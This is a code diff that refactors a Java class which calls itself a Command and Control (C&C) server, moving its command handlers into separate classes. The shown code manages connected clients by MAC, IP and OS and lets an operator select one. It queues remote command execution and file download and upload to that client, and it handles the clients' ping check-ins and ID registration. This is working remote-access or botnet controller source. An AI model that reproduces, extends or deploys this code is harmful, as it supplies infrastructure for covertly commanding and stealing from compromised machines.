@@ -1,14 +1,10 @@
 package server;
 
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.OutputStream;
 import java.util.HashMap;
 
-import tools.Command;
-import tools.Connection;
-import tools.Log;
-import tools.ParsedCommand;
+import commands.*;
+import tools.*;
 
 /**
  * Represents a Command and Control (C&C) server
@@ -18,58 +14,60 @@ import tools.ParsedCommand;
  */
 public class CommandServer implements RequestHandler, CommandHandler {
 	
-	// The string sent when no matching command is found
+	/**
+	 *  The string returned when no matching command is found
+	 */
 	public static final String ERROR_COMMAND_NOT_FOUND = "Command not found.";
 	
-	// The sets of commands for both the server and the client
-	private final HashMap<String, Command> cmdsServer;
-	private final HashMap<String, Command> cmdsClient;
+	/**
+	 *  The set of commands for the server (CommandHandler)
+	 */
+	private final HashMap<String, CommandInterface> cmdsServer;
 	
-	// The set of connected clients IPs
+	/**
+	 *  The set of commands for the client (RequestHandler)
+	 */
+	private final HashMap<String, CommandInterface> cmdsClient;
+	
+	/**
+	 *  The set of connected clients IPs
+	 */
 	private ClientPool clients;
+	
+	/**
+	 *  The currently selected client id.
+	 *  When no client is selected, its value is -1.
+	 */
 	private int currentClient = -1;
+	
+	/**
+	 * true if the previously selected client waits for an answer.
+	 * Set to true when answering a ping request.
+	 */
 	private boolean clientConnected = false;
 	
-	// Log requests
+	/**
+	 * To log incoming out outcoming requests.
+	 */
 	private Log log;
 	
 	public CommandServer() {
+		// Starting log
 		log = new Log();
 		
 		try {
 			clients = new ClientPool();
-		} catch (IOException e1) {
-			// TODO Auto-generated catch block
-			e1.printStackTrace();
+		} catch (IOException e) {
+			e.printStackTrace();
 		}
 		
-		cmdsServer = new HashMap<String, Command>();
-		cmdsClient = new HashMap<String, Command>();
-		
-		
+		cmdsServer = new HashMap<String, CommandInterface>();
+		cmdsClient = new HashMap<String, CommandInterface>();
 		
 		// ***** GENERAL SEVER COMMANDS ***** //
 		
-		// Display available commands
-		cmdsServer.put("help", new Command(){
-			
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				StringBuilder builder = new StringBuilder();
-				
-				for (String key: cmdsServer.keySet())
-					builder.append(key + '\n');
-				
-				// Removing last '\n'
-				builder.setCharAt(builder.length() - 1, (char) 0);
-				
-				return builder.toString();
-			}
-			
-		});
-		
 		// Close user input
-		cmdsServer.put("exit", new Command(){
+		cmdsServer.put("exit", new CommandInterface(){
 			
 			@Override
 			public String exec(ParsedCommand pCmd) {
@@ -78,222 +76,72 @@ public class CommandServer implements RequestHandler, CommandHandler {
 			
 		});
 		
-		// List all connected clients
-		cmdsServer.put("list", new Command(){
-			
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				
-				StringBuilder sb = new StringBuilder();
-				sb.append("id  \tMAC address      \tIP address    \tOS\n");
-				
-				for (int id: clients.keySet()) {
-					sb.append(id + "\t"
-							+ clients.get(id).getMACAddress() + "\t"
-							+ clients.get(id).getInetAddress() + "\t"
-							+ clients.get(id).getOs() + "\n");
-				}
-				
-				// Removing last '\n'
-				sb.setCharAt(sb.length() - 1, (char) 0);
-				
-				return sb.toString();
-			}
-			
-		});
+		cmdsServer.put("help", new HelpCmd(this));
+		cmdsServer.put("list", new ListCmd(this));
+		cmdsServer.put("select", new SelectCmd(this));
+		cmdsServer.put("unselect", new UnselectCmd(this));
+		cmdsServer.put("log", new LogCmd(this));
+		cmdsServer.put("save_clients", new SaveClientsCmd(this));
+		cmdsServer.put("info", new InfoCmd(this));
 		
-		// Select a client to 'exec' commands
-		cmdsServer.put("select", new Command(){
-			
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				if (pCmd.args.length != 1)
-					return "Usage: select ID";
-				int id = Integer.parseInt(pCmd.args[0]);
-				if (clients.containsKey(id)) {
-					currentClient = id;
-					return "Selected client " + id;
-				}
-				return "Wrong id.";
-			}
-			
-		});
+		cmdsServer.put("exec", new ToClientCommand(this, "EXEC"));
+		cmdsServer.put("dwnld", new ToClientCommand(this, "DWNLD"));
+		cmdsServer.put("upld", new ToClientCommand(this, "UPLD"));
 		
-		// Unselect a client
-		cmdsServer.put("unselect", new Command(){
-
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				clients.get(currentClient).stackCmd("DONE");
-				currentClient = -1;
-				return "Client unselected.";
-			}
-			
-		});
-		
-		// Show log
-		cmdsServer.put("log", new Command(){
-			
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				if (pCmd.args.length > 0)
-					return log.getText(Integer.parseInt(pCmd.args[0]));
-				return log.getText();
-			}
-			
-		});
-		
-		// Save clients
-		cmdsServer.put("save_clients", new Command(){
-
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				
-				try {
-					return clients.save("clients");
-				} catch (IOException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-				return null;
-			}
-			
-		});
-		
-		// Display client info
-		cmdsServer.put("info", new Command(){
-
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				if (currentClient >= 0) {					
-					return clients.get(currentClient).toString();
-				}
-				return "No selected client.";
-			}
-			
-		});
-		
-		
-		
-		// ***** CONNECTED CLIENT COMMANDS ***** //
-		
-		// Execute a command
-		cmdsServer.put("exec", new ClientCommand(this, "EXEC"));
-		
-		// Download a file
-		cmdsServer.put("dwnld", new ClientCommand(this, "DWNLD"));
-		
-		// Upload a file
-		cmdsServer.put("upld", new ClientCommand(this, "UPLD"));
-		
-		
-		
-		// ***** CLIENT REQUESTS COMMANDS ***** //
-		
-		// Close connection
-		cmdsClient.put("DONE", new Command() {
-
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				if (currentClient >= 0)
-					return "N_DONE";
-				return "DONE";
-			}
-			
-		});
-		
-		// Assign an ID to a client
-		cmdsClient.put("GETID", new Command(){
-			
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				
-				ConnectedClient client = clients.findByMac(pCmd.args[0]);
-				int id;
-				
-				if (client != null) // Already known client
-					id = client.getId(); 
-				else				// New client
-					id = clients.addClient(pCmd.args[0]);
-				
-				// Storing IP
-				clients.get(id).setInetAddress(pCmd.args[1]);
-				
-				// Storing OS
-				clients.get(id).setOs(pCmd.argLine(2));
-				
-				return Integer.toString(id);
-			}
-			
-		});
-		
-		// Answer a ping
-		cmdsClient.put("PING", new Command(){
-			
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				ConnectedClient client;
-				if ((client = clients.identify(pCmd.args[0])) != null
-						&& client.hasCmd()) {
-					return client.popCmd();
-				}
-				if (currentClient >= 0) {
-					clientConnected = true;
-					System.out.print("\nClient " + currentClient
-							+ " connected.\n" + getPrefix() + ">");
-					return "N_DONE";
-				}
-				return "DONE";
-			}
-			
-		});
-		
-		cmdsClient.put("OUT", new Command(){
-
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				
-				System.out.print('\n');
-				for (int i = 0; i < pCmd.payload.length; i++)
-					System.out.print((char) pCmd.payload[i]);
-				System.out.print(getPrefix() + ">");
-				if (currentClient >= 0)
-					return "N_DONE";
-				return "DONE";
-			}
-			
-		});
-		
-		cmdsClient.put("UPLD", new Command(){
-
-			@Override
-			public String exec(ParsedCommand pCmd) {
-				
-				try {
-					OutputStream out = new FileOutputStream(pCmd.args[0]);
-					for (int i = 0; i < pCmd.payload.length; i++) {
-						out.write(pCmd.payload[i]);
-					}
-					out.close();
-				} catch (IOException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-				if (currentClient >= 0)
-					return "N_DONE";
-				return "DONE";
-			}
-			
-		});
+		cmdsClient.put("DONE", new DoneCmd(this));
+		cmdsClient.put("GETID", new GetIdCmd(this));
+		cmdsClient.put("PING", new PingCmd(this));
+		cmdsClient.put("OUT", new OutCmd(this));
+		cmdsClient.put("UPLD", new UpldCmd(this));
 		
 	}
 
+	public ClientPool getClients() {
+		return clients;
+	}
+
+	public void setClients(ClientPool clients) {
+		this.clients = clients;
+	}
+
+	public int getCurrentClient() {
+		return currentClient;
+	}
+
+	public void setCurrentClient(int currentClient) {
+		this.currentClient = currentClient;
+	}
+
+	public boolean isClientConnected() {
+		return clientConnected;
+	}
+
+	public void setClientConnected(boolean clientConnected) {
+		this.clientConnected = clientConnected;
+	}
+
+	public Log getLog() {
+		return log;
+	}
+
+	public void setLog(Log log) {
+		this.log = log;
+	}
+
+	public HashMap<String, CommandInterface> getCmdsServer() {
+		return cmdsServer;
+	}
+
+	public HashMap<String, CommandInterface> getCmdsClient() {
+		return cmdsClient;
+	}
+	
 	@Override
 	public void handle(Connection conn)
 			throws IOException {
 				
 		String response = null;
-		while (response == null || !response.startsWith("DONE")) {
+		while (response == null || !response.startsWith(ServerCommand.DONE)) {
 			
 			ParsedCommand pCmd = conn.readRequest();
 			
@@ -308,7 +156,8 @@ public class CommandServer implements RequestHandler, CommandHandler {
 				conn.write(response);
 			}
 			
-			if (response != null && response.startsWith("N_DONE")) {
+			if (response != null
+					&& response.startsWith(ServerCommand.N_DONE)) {
 				ConnectedClient client = clients.get(currentClient);
 				while (!client.hasCmd())
 					try {
@@ -344,14 +193,6 @@ public class CommandServer implements RequestHandler, CommandHandler {
 		if (currentClient >= 0 && !clientConnected)
 			prefix.append("*");
 		return prefix.toString();
-	}
-	
-	public int getCurrentClient() {
-		return currentClient;
-	}
-	
-	public ClientPool getClients() {
-		return clients;
 	}
 	
 }
